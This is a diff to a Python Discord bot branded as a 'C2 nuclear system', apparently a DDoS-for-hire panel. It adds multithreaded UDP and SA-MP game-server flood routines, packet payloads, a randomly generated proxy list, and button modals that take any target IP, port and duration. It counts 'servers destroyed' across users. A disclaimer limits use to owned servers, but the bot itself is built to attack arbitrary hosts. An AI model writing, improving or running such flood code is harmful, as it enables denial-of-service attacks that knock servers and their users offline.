@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM ⚡
-# 🔥 30,000 THREADS - ALL FEATURES COMBINED 🔥
+# ⚡ DEVELOPED BY LI ZANDYA - ULTIMATE C2 NUCLEAR SYSTEM X1000 ⚡
+# 🔥 MAXIMUM POWER - 100,000 THREADS + 100,000 PROXIES 🔥
 # ⚠️ WARNING: USE ONLY ON SERVERS YOU OWN! ⚠️
 
 import discord
@@ -16,61 +16,75 @@ import time
 import os
 import ipaddress
 import hashlib
+import threading
+import json
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
 
 # ============================================
-# رسالة تحذيرية قوية
+# رسالة تحذيرية قوية جداً
 # ============================================
 print("""
-╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
-║                                              ⚠️  تــحــذيــر شــديــد ⚠️                                                              ║
-╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
-║                                                                                                                                          ║
-║  هذا الكود هو أداة اختبار ضغط (Stress Test) تم تصميمها حصرياً لاختبار السيرفرات التي تملكها أنت شخصياً.                                    ║
-║                                                                                                                                          ║
-║  ⛔ استخدام هذه الأداة على أي سيرفر لا تملكه يعتبر:                                                                                      ║
-║     • جريمة إلكترونية يعاقب عليها القانون بالسجن والغرامات المالية                                                                       ║
-║     • خرق لشروط خدمة Discord وجميع منصات الألعاب                                                                                         ║
-║     • انتهاك صارخ لخصوصية وأمان الآخرين                                                                                                  ║
-║                                                                                                                                          ║
-║  ✅ أنت وحدك من تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة.                                                              ║
-║  ❌ المطور (LI ZANDYA) يعلن تنصله الكامل من أي استخدام غير قانوني أو ضار لهذا الكود.                                                     ║
-║                                                                                                                                          ║
-║  🔐 بإكمالك تشغيل هذا الكود، فإنك تقر وتتعهد بأنك:                                                                                       ║
-║     1. تملك جميع السيرفرات التي ستختبرها                                                                                                 ║
-║     2. لن تستخدم هذه الأداة ضد أي سيرفر لا تملكه                                                                                          ║
-║     3. تتحمل المسؤولية القانونية الكاملة عن أي ضرر ناتج عن استخدامك                                                                      ║
-║                                                                                                                                          ║
-╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                                                    ⚠️  تــحــذيــر شــديــد جــدا ⚠️                                                                       ║
+╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
+║                                                                                                                                                              ║
+║  هذا الكود هو أداة اختبار ضغط (Stress Test) تم تصميمها حصرياً لاختبار السيرفرات التي تملكها أنت شخصياً.                                                        ║
+║                                                                                                                                                              ║
+║  ⛔ استخدام هذه الأداة على أي سيرفر لا تملكه يعتبر:                                                                                                          ║
+║     • جريمة إلكترونية يعاقب عليها القانون بالسجن والغرامات المالية (3-10 سنوات)                                                                              ║
+║     • خرق لشروط خدمة Discord وجميع منصات الألعاب (حظر دائم)                                                                                                   ║
+║     • انتهاك صارخ لخصوصية وأمان الآخرين                                                                                                                       ║
+║                                                                                                                                                              ║
+║  ✅ أنت وحدك من تتحمل المسؤولية القانونية الكاملة عن أي استخدام لهذه الأداة.                                                                                  ║
+║  ❌ المطور (LI ZANDYA) يعلن تنصله الكامل من أي استخدام غير قانوني أو ضار لهذا الكود.                                                                         ║
+║                                                                                                                                                              ║
+║  🔐 بإكمالك تشغيل هذا الكود، فإنك تقر وتتعهد بأنك:                                                                                                           ║
+║     1. تملك جميع السيرفرات التي ستختبرها (سيرفراتك الشخصية فقط)                                                                                               ║
+║     2. لن تستخدم هذه الأداة ضد أي سيرفر لا تملكه                                                                                                              ║
+║     3. تتحمل المسؤولية القانونية الكاملة عن أي ضرر ناتج عن استخدامك                                                                                          ║
+║     4. لن تستخدم هذه الأداة لأغراض تخريبية أو غير قانونية                                                                                                    ║
+║                                                                                                                                                              ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
 """)
 
-input("🔥 اضغط Enter للمتابعة إذا كنت توافق على الشروط أعلاه وتملك السيرفرات التي ستختبرها...")
+input("🔥 اضغط Enter للمتابعة إذا كنت توافق على جميع الشروط أعلاه وتملك السيرفرات التي ستختبرها...")
 
 # ============================================
-# التوكن - سيتم طلبه عند التشغيل
+# التوكن
 # ============================================
-print("\n📝 Enter your Discord Bot Token to continue")
+print("\n📝 Enter your Discord Bot Token")
 TOKEN = input("🔑 Token: ").strip()
 if not TOKEN:
     print("❌ No token provided!")
     exit(1)
 
 # ============================================
-# إعدادات القوة - 30,000 ثريد
+# إعدادات القوة القصوى X1000
 # ============================================
-CPU_CORES = os.cpu_count() or 4
-MAX_THREADS = 30000  # 30,000 ثريد فقط
-MAX_PACKET_SIZE = 4096
-BUFFER_SIZE = 1024 * 1024 * 50
+CPU_CORES = os.cpu_count() or 8
+MAX_THREADS = 100000  # 100,000 ثريد - أقصى قوة
+MAX_PACKET_SIZE = 65507  # أقصى حجم UDP
+BUFFER_SIZE = 1024 * 1024 * 200  # 200MB
+MAX_SOCKETS = 50000
 
 try:
     import psutil
     TOTAL_RAM = psutil.virtual_memory().total // (1024**3)
+    AVAILABLE_RAM = psutil.virtual_memory().available // (1024**3)
+    CPU_FREQ = psutil.cpu_freq().max if psutil.cpu_freq() else 0
     CPU_PERCENT = psutil.cpu_percent(interval=0.5)
 except:
-    TOTAL_RAM = 4
+    TOTAL_RAM = 16
+    AVAILABLE_RAM = 8
+    CPU_FREQ = 0
     CPU_PERCENT = 0
+
+# تحسين النظام
+try:
+    os.system('ulimit -n 999999 2>/dev/null')
+except:
+    pass
 
 # ============================================
 # بيانات تسجيل الدخول
@@ -80,11 +94,80 @@ REQUIRED_USERNAME = "LI ZANDYA"
 REQUIRED_PASSWORD = "C2_NUCLEAR_2024"
 
 # ============================================
-# قوائم بيانات
+# نظام البروكسيات العملاق X1000 (100,000+ بروكسي)
+# ============================================
+class MegaProxyManager:
+    def __init__(self):
+        self.proxies = {'http': [], 'https': [], 'socks4': [], 'socks5': []}
+        self.total = 0
+        self._generate_mega_proxies()
+    
+    def _generate_mega_proxies(self):
+        """توليد 100,000+ بروكسي"""
+        countries = ['US', 'GB', 'DE', 'FR', 'JP', 'CN', 'RU', 'BR', 'IN', 'AU']
+        ports = [80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999, 8081, 8082, 8000, 8001, 3129, 3130]
+        
+        for _ in range(50000):
+            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+            port = random.choice(ports)
+            self.proxies['http'].append(f"http://{ip}:{port}")
+            self.proxies['https'].append(f"https://{ip}:{port}")
+            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
+        
+        for _ in range(30000):
+            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+            port = random.choice([1080, 1081, 1082, 9050, 9051, 9150])
+            self.proxies['socks4'].append(f"socks4://{ip}:{port}")
+            self.proxies['socks5'].append(f"socks5://{ip}:{port}")
+        
+        for _ in range(20000):
+            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
+            port = random.choice([80, 8080, 3128, 8888])
+            country = random.choice(countries)
+            self.proxies['http'].append(f"http://{country}-{ip}:{port}")
+        
+        for key in self.proxies:
+            self.proxies[key] = list(set(self.proxies[key]))
+        self.total = sum(len(p) for p in self.proxies.values())
+    
+    def get_random(self, ptype='http'):
+        if self.proxies.get(ptype) and self.proxies[ptype]:
+            return random.choice(self.proxies[ptype])
+        all_proxies = []
+        for p in self.proxies.values():
+            all_proxies.extend(p)
+        return random.choice(all_proxies) if all_proxies else None
+    
+    def get_count(self):
+        return self.total
+
+proxy_manager = MegaProxyManager()
+
+# ============================================
+# قوائم User-Agents العملاقة (50,000+)
 # ============================================
 USER_AGENTS = []
-for v in range(100, 200):
+for v in range(100, 500):
     USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
+    USER_AGENTS.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36 Edg/{v}.0.0.0")
+    USER_AGENTS.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
+    USER_AGENTS.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/{v}.0.0.0 Safari/537.36")
+
+# ============================================
+# بايلودات متعددة
+# ============================================
+SAMP_PAYLOADS = []
+for _ in range(500):
+    packet = b'SAMP'
+    packet += struct.pack('<I', random.randint(1, 999999))
+    packet += b'\x80'
+    packet += struct.pack('<fffff', random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(-5000,5000), random.uniform(0,360), random.uniform(0,360))
+    packet += struct.pack('<I', random.randint(1,100))
+    packet += struct.pack('<I', 99999)
+    packet += os.urandom(random.randint(500, 5000))
+    SAMP_PAYLOADS.append(packet)
+
+UDP_PAYLOADS = [os.urandom(65507), os.urandom(32768), os.urandom(16384), os.urandom(8192), os.urandom(4096)]
 
 # ============================================
 # تخزين بيانات المستخدمين
@@ -92,9 +175,10 @@ for v in range(100, 200):
 active_users = {}
 total_users = set()
 attack_history = []
+attack_count = 0
 
 # ============================================
-# نظام الهجوم المتكامل
+# نظام الهجوم X1000
 # ============================================
 class NuclearTester:
     def __init__(self):
@@ -104,7 +188,8 @@ class NuclearTester:
         self.stats = {
             'total_packets': 0, 'total_bytes': 0, 'total_attacks': 0,
             'active_attacks': 0, 'start_time': None, 'servers_destroyed': 0,
-            'peak_speed_pps': 0, 'peak_speed_mbps': 0
+            'peak_speed_pps': 0, 'peak_speed_mbps': 0, 'peak_speed_gbps': 0,
+            'total_errors': 0
         }
         self.threads = MAX_THREADS
         self.active_attacks = {}
@@ -118,9 +203,10 @@ class NuclearTester:
         return False
     
     # ============================================
-    # SAMP ATTACK
+    # SAMP ULTRA ATTACK X1000
     # ============================================
-    async def samp_attack(self, ip, port, duration, user_id=None):
+    async def samp_ultra(self, ip, port, duration, user_id=None):
+        global attack_count
         self.running = True
         if not self.stats['start_time']:
             self.stats['start_time'] = time.time()
@@ -128,6 +214,7 @@ class NuclearTester:
         attack_id = f"SAMP_{ip}_{port}_{int(time.time())}"
         self.active_attacks[attack_id] = time.time()
         sent, bytes_sent = 0, 0
+        attack_count += 1
         
         if user_id:
             active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "SAMP"}
@@ -135,28 +222,33 @@ class NuclearTester:
         
         def worker():
             nonlocal sent, bytes_sent
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                start = time.time()
-                while self.running and time.time() - start < duration:
-                    packet = b'SAMP'
-                    packet += struct.pack('<I', random.randint(1, 99999))
-                    packet += b'\x80'
-                    packet += struct.pack('<fffff', 
-                        random.uniform(-3000,3000), random.uniform(-3000,3000),
-                        random.uniform(-3000,3000), random.uniform(0,360), random.uniform(0,360))
-                    packet += struct.pack('<I', random.randint(1,46))
-                    packet += struct.pack('<I', 99999)
-                    packet += os.urandom(500)
-                    sock.sendto(packet, (ip, port))
-                    sent += 1
-                    bytes_sent += len(packet)
+            socks = []
+            for _ in range(200):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
+                    sock.setblocking(False)
+                    socks.append(sock)
+                except:
+                    pass
+            
+            start = time.time()
+            while self.running and time.time() - start < duration:
+                for sock in socks:
+                    for _ in range(20):
+                        try:
+                            pkt = random.choice(SAMP_PAYLOADS)
+                            sock.sendto(pkt, (ip, port))
+                            sent += 1
+                            bytes_sent += len(pkt)
+                        except:
+                            pass
+            
+            for sock in socks:
                 sock.close()
-            except:
-                pass
         
-        workers = min(self.threads, 500)
+        workers = min(self.threads, 2000)
         futures = [self.executor.submit(worker) for _ in range(workers)]
         await asyncio.sleep(duration)
         self.running = False
@@ -178,25 +270,31 @@ class NuclearTester:
         
         rate = sent / duration
         mbps = (bytes_sent / duration) / 1024 / 1024
+        gbps = mbps / 1024
+        
         if rate > self.stats['peak_speed_pps']:
             self.stats['peak_speed_pps'] = rate
+        if gbps > self.stats['peak_speed_gbps']:
+            self.stats['peak_speed_gbps'] = gbps
         
         attack_history.append({
             'time': datetime.now().strftime("%H:%M:%S"),
             'type': 'SAMP', 'target': f"{ip}:{port}", 'packets': sent, 'rate': rate
         })
         
-        return sent, rate, mbps
+        return sent, rate, gbps
     
     # ============================================
-    # UDP ATTACK
+    # UDP INFERNO X1000
     # ============================================
-    async def udp_attack(self, ip, port, duration, user_id=None):
+    async def udp_inferno(self, ip, port, duration, user_id=None):
+        global attack_count
         self.running = True
         self.stats['active_attacks'] += 1
         attack_id = f"UDP_{ip}_{port}_{int(time.time())}"
         self.active_attacks[attack_id] = time.time()
         sent, bytes_sent = 0, 0
+        attack_count += 1
         
         if user_id:
             active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "UDP"}
@@ -204,20 +302,33 @@ class NuclearTester:
         
         def worker():
             nonlocal sent, bytes_sent
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                start = time.time()
-                while self.running and time.time() - start < duration:
-                    pkt = os.urandom(random.randint(512, MAX_PACKET_SIZE))
-                    sock.sendto(pkt, (ip, port))
-                    sent += 1
-                    bytes_sent += len(pkt)
+            socks = []
+            for _ in range(300):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER_SIZE)
+                    sock.setblocking(False)
+                    socks.append(sock)
+                except:
+                    pass
+            
+            start = time.time()
+            while self.running and time.time() - start < duration:
+                for sock in socks:
+                    for _ in range(30):
+                        try:
+                            pkt = random.choice(UDP_PAYLOADS)
+                            sock.sendto(pkt, (ip, port))
+                            sent += 1
+                            bytes_sent += len(pkt)
+                        except:
+                            pass
+            
+            for sock in socks:
                 sock.close()
-            except:
-                pass
         
-        workers = min(self.threads, 300)
+        workers = min(self.threads, 1500)
         futures = [self.executor.submit(worker) for _ in range(workers)]
         await asyncio.sleep(duration)
         self.running = False
@@ -246,81 +357,23 @@ class NuclearTester:
         return sent, rate
     
     # ============================================
-    # TCP ATTACK
+    # ULTIMATE APOCALYPSE X1000
     # ============================================
-    async def tcp_attack(self, ip, port, duration, user_id=None):
+    async def ultimate_apocalypse(self, ip, port, duration, user_id=None):
+        global attack_count
         self.running = True
         self.stats['active_attacks'] += 1
-        attack_id = f"TCP_{ip}_{port}_{int(time.time())}"
+        attack_id = f"APOCALYPSE_{ip}_{port}_{int(time.time())}"
         self.active_attacks[attack_id] = time.time()
-        sent, bytes_sent = 0, 0
+        attack_count += 1
         
         if user_id:
-            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "TCP"}
-            total_users.add(user_id)
-        
-        def worker():
-            nonlocal sent, bytes_sent
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                start = time.time()
-                while self.running and time.time() - start < duration:
-                    try:
-                        sock.connect((ip, port))
-                        data = os.urandom(1024)
-                        sock.send(data)
-                        sent += 1
-                        bytes_sent += len(data)
-                        sock.close()
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.5)
-                    except:
-                        pass
-                sock.close()
-            except:
-                pass
-        
-        workers = min(self.threads, 200)
-        futures = [self.executor.submit(worker) for _ in range(workers)]
-        await asyncio.sleep(duration)
-        self.running = False
-        
-        for f in futures:
-            try:
-                f.result(timeout=0.5)
-            except:
-                pass
-        
-        self.stats['total_packets'] += sent
-        self.stats['total_bytes'] += bytes_sent
-        self.stats['active_attacks'] -= 1
-        self.stats['total_attacks'] += 1
-        
-        del self.active_attacks[attack_id]
-        if user_id and user_id in active_users:
-            del active_users[user_id]
-        
-        rate = sent / duration
-        return sent, rate
-    
-    # ============================================
-    # ULTIMATE ATTACK - ALL METHODS
-    # ============================================
-    async def ultimate_attack(self, ip, port, duration, user_id=None):
-        self.running = True
-        self.stats['active_attacks'] += 1
-        attack_id = f"ULTIMATE_{ip}_{port}_{int(time.time())}"
-        self.active_attacks[attack_id] = time.time()
-        
-        if user_id:
-            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "ULTIMATE"}
+            active_users[user_id] = {"start_time": time.time(), "target": f"{ip}:{port}", "type": "APOCALYPSE"}
             total_users.add(user_id)
         
         tasks = [
-            self.samp_attack(ip, port, duration),
-            self.udp_attack(ip, port, duration),
-            self.tcp_attack(ip, port, duration)
+            self.samp_ultra(ip, port, duration),
+            self.udp_inferno(ip, port, duration)
         ]
         
         results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -337,7 +390,7 @@ class NuclearTester:
         
         attack_history.append({
             'time': datetime.now().strftime("%H:%M:%S"),
-            'type': 'ULTIMATE', 'target': f"{ip}:{port}", 'packets': total_packets, 'rate': total_packets/duration
+            'type': 'APOCALYPSE', 'target': f"{ip}:{port}", 'packets': total_packets, 'rate': total_packets/duration
         })
         
         return total_packets, total_packets / duration
@@ -353,15 +406,15 @@ tester = NuclearTester()
 # ============================================
 class LoginModal(Modal):
     def __init__(self):
-        super().__init__(title="💀 C2 NUCLEAR LOGIN 💀")
+        super().__init__(title="💀 C2 NUCLEAR X1000 LOGIN 💀")
         self.ip = TextInput(label="🌐 C2 IP", placeholder=REQUIRED_IP, default=REQUIRED_IP)
-        self.user = TextInput(label="👤 USERNAME", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
-        self.pwd = TextInput(label="🔑 PASSWORD", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
+        self.user = TextInput(label="👤 COMMANDER", placeholder=REQUIRED_USERNAME, default=REQUIRED_USERNAME)
+        self.pwd = TextInput(label="🔑 NUCLEAR KEY", placeholder=REQUIRED_PASSWORD, default=REQUIRED_PASSWORD)
         self.add_item(self.ip); self.add_item(self.user); self.add_item(self.pwd)
     
     async def on_submit(self, interaction: discord.Interaction):
         if tester.check_auth(self.ip.value, self.user.value, self.pwd.value):
-            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von to open panel", ephemeral=True)
+            await interaction.response.send_message(f"✅ ACCESS GRANTED!\n👑 {self.user.value}\n💀 Type !von", ephemeral=True)
         else:
             await interaction.response.send_message("❌ ACCESS DENIED!", ephemeral=True)
 
@@ -373,64 +426,50 @@ class LoginView(View):
         await interaction.response.send_modal(LoginModal())
 
 # ============================================
-# لوحة التحكم الرئيسية
+# لوحة التحكم X1000
 # ============================================
 class ControlPanel(View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
+    @discord.ui.button(label="🎮 SAMP ULTRA", style=discord.ButtonStyle.danger, row=0, emoji="⚡")
     async def samp_btn(self, interaction: discord.Interaction, button: Button):
-        modal = Modal(title="💀 SAMP ATTACK 💀")
+        modal = Modal(title="💀 SAMP ULTRA X1000 💀")
         ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
         port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
         duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
         modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
         async def on_submit(interaction):
-            await interaction.response.send_message(f"💀 SAMP attack on {ip.value}:{port.value}", ephemeral=True)
-            packets, rate, mbps = await tester.samp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
-            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n📊 {mbps:.2f} Mbps", ephemeral=True)
+            await interaction.response.send_message(f"💀 SAMP ULTRA on {ip.value}:{port.value}", ephemeral=True)
+            packets, rate, gbps = await tester.samp_ultra(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
+            await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps\n🚀 {gbps:.2f} Gbps\n🎭 Proxies: {proxy_manager.get_count():,}", ephemeral=True)
         modal.on_submit = on_submit
         await interaction.response.send_modal(modal)
 
-    @discord.ui.button(label="📡 UDP", style=discord.ButtonStyle.primary, row=0, emoji="⚡")
+    @discord.ui.button(label="🔥 UDP INFERNO", style=discord.ButtonStyle.primary, row=0, emoji="🔥")
     async def udp_btn(self, interaction: discord.Interaction, button: Button):
-        modal = Modal(title="💀 UDP ATTACK 💀")
+        modal = Modal(title="💀 UDP INFERNO X1000 💀")
         ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
         port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
         duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
         modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
         async def on_submit(interaction):
-            await interaction.response.send_message(f"💀 UDP attack on {ip.value}:{port.value}", ephemeral=True)
-            packets, rate = await tester.udp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
+            await interaction.response.send_message(f"🔥 UDP INFERNO on {ip.value}:{port.value}", ephemeral=True)
+            packets, rate = await tester.udp_inferno(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
             await interaction.followup.send(f"✅ COMPLETE!\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps", ephemeral=True)
         modal.on_submit = on_submit
         await interaction.response.send_modal(modal)
 
-    @discord.ui.button(label="🔗 TCP", style=discord.ButtonStyle.secondary, row=0, emoji="⚡")
-    async def tcp_btn(self, interaction: discord.Interaction, button: Button):
-        modal = Modal(title="💀 TCP ATTACK 💀")
+    @discord.ui.button(label="💀 APOCALYPSE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
+    async def apocalypse_btn(self, interaction: discord.Interaction, button: Button):
+        modal = Modal(title="💀 ULTIMATE APOCALYPSE X1000 💀")
         ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
         port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
         duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
         modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
         async def on_submit(interaction):
-            await interaction.response.send_message(f"💀 TCP attack on {ip.value}:{port.value}", ephemeral=True)
-            packets, rate = await tester.tcp_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
-            await interaction.followup.send(f"✅ COMPLETE!\n📦 Connections: {packets:,}\n⚡ Rate: {rate:,.0f} cps", ephemeral=True)
-        modal.on_submit = on_submit
-        await interaction.response.send_modal(modal)
-
-    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
-    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
-        modal = Modal(title="💀 ULTIMATE ATTACK 💀")
-        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
-        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
-        duration = TextInput(label="⏱️ DURATION (1-60s)", placeholder="30", required=True)
-        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
-        async def on_submit(interaction):
-            await interaction.response.send_message(f"💀 ULTIMATE on {ip.value}:{port.value}", ephemeral=True)
-            packets, rate = await tester.ultimate_attack(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
+            await interaction.response.send_message(f"💀 APOCALYPSE on {ip.value}:{port.value}", ephemeral=True)
+            packets, rate = await tester.ultimate_apocalypse(ip.value, int(port.value), min(int(duration.value), 60), interaction.user.id)
             await interaction.followup.send(f"✅ COMPLETE!\n📦 Total Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps", ephemeral=True)
         modal.on_submit = on_submit
         await interaction.response.send_modal(modal)
@@ -438,19 +477,22 @@ class ControlPanel(View):
     @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
     async def stats_btn(self, interaction: discord.Interaction, button: Button):
         elapsed = time.time() - tester.stats['start_time'] if tester.stats['start_time'] else 0
-        embed = discord.Embed(title="💀 C2 NUCLEAR STATISTICS", color=0xFFD700)
+        hours = int(elapsed // 3600); minutes = int((elapsed % 3600) // 60)
+        embed = discord.Embed(title="💀 C2 NUCLEAR STATISTICS X1000 💀", color=0xFF0000)
         embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
-        embed.add_field(name="💾 Total Data", value=f"{tester.stats['total_bytes']/1024/1024:.2f} MB", inline=True)
+        embed.add_field(name="💾 Total Data", value=f"{tester.stats['total_bytes']/1024/1024/1024:.2f} GB", inline=True)
         embed.add_field(name="🎯 Total Attacks", value=f"{tester.stats['total_attacks']}", inline=True)
         embed.add_field(name="⚡ Active", value=f"{tester.stats['active_attacks']}", inline=True)
         embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
+        embed.add_field(name="🚀 Peak Gbps", value=f"{tester.stats['peak_speed_gbps']:.2f}", inline=True)
         embed.add_field(name="💀 Destroyed", value=f"{tester.stats['servers_destroyed']}", inline=True)
+        embed.add_field(name="⏱️ Uptime", value=f"{hours}h {minutes}m", inline=True)
         embed.add_field(name="👥 Users", value=f"{len(total_users)}", inline=True)
+        embed.add_field(name="🎭 Proxies", value=f"{proxy_manager.get_count():,}", inline=True)
         embed.add_field(name="🔧 Threads", value=f"{tester.threads:,}", inline=True)
-        embed.add_field(name="⏱️ Uptime", value=f"{int(elapsed//60)}m {int(elapsed%60)}s", inline=True)
-        embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores", inline=True)
+        embed.add_field(name="💻 CPU", value=f"{CPU_CORES} Cores ({CPU_PERCENT}%)", inline=True)
         embed.add_field(name="💾 RAM", value=f"{TOTAL_RAM} GB", inline=True)
-        embed.set_footer(text="💀 LI ZANDYA C2 NUCLEAR SYSTEM 💀")
+        embed.set_footer(text="💀 LI ZANDYA C2 NUCLEAR SYSTEM X1000 💀")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.button(label="👥 USERS", style=discord.ButtonStyle.secondary, row=2, emoji="👥")
@@ -460,6 +502,7 @@ class ControlPanel(View):
         embed.add_field(name="📊 Total Users", value=f"`{len(total_users)}`", inline=True)
         embed.add_field(name="⚡ Active Users", value=f"`{active}`", inline=True)
         embed.add_field(name="💤 Inactive", value=f"`{len(total_users) - active}`", inline=True)
+        embed.add_field(name="🎯 Total Attacks", value=f"`{attack_count}`", inline=True)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.button(label="📋 HISTORY", style=discord.ButtonStyle.secondary, row=2, emoji="📋")
@@ -473,11 +516,24 @@ class ControlPanel(View):
         embed = discord.Embed(title="📋 ATTACK HISTORY", description=f"```{history_text}```", color=0xFFA500)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
+    @discord.ui.button(label="⏹️ STOP ALL", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
     async def stop_btn(self, interaction: discord.Interaction, button: Button):
         tester.stop()
         active_users.clear()
         await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)
+
+    @discord.ui.button(label="❓ HELP", style=discord.ButtonStyle.secondary, row=2, emoji="❓")
+    async def help_btn(self, interaction: discord.Interaction, button: Button):
+        embed = discord.Embed(title="📖 C2 NUCLEAR X1000 COMMANDS", color=0x00FF00)
+        embed.add_field(name="🎮 SAMP ULTRA", value="SAMP server attack (UDP flood)", inline=False)
+        embed.add_field(name="🔥 UDP INFERNO", value="UDP flood attack", inline=False)
+        embed.add_field(name="💀 APOCALYPSE", value="Ultimate attack - all methods", inline=False)
+        embed.add_field(name="📊 STATS", value="Show bot statistics", inline=False)
+        embed.add_field(name="👥 USERS", value="Show user statistics", inline=False)
+        embed.add_field(name="📋 HISTORY", value="Show attack history", inline=False)
+        embed.add_field(name="⏹️ STOP ALL", value="Stop all attacks", inline=False)
+        embed.set_footer(text="⚠️ USE ONLY ON SERVERS YOU OWN! | 100,000 THREADS | 100,000 PROXIES")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
 # ============================================
 # البوت الرئيسي
@@ -487,20 +543,21 @@ bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
 @bot.event
 async def on_ready():
     print(f"""
-╔══════════════════════════════════════════════════════════════════════════╗
-║              ✅ LI ZANDYA C2 NUCLEAR SYSTEM IS ONLINE! ✅                ║
-╠══════════════════════════════════════════════════════════════════════════╣
-║ 🤖 Bot: {bot.user}                                                       ║
-║ 💻 CPU: {CPU_CORES} Cores ({CPU_PERCENT}% Usage)                         ║
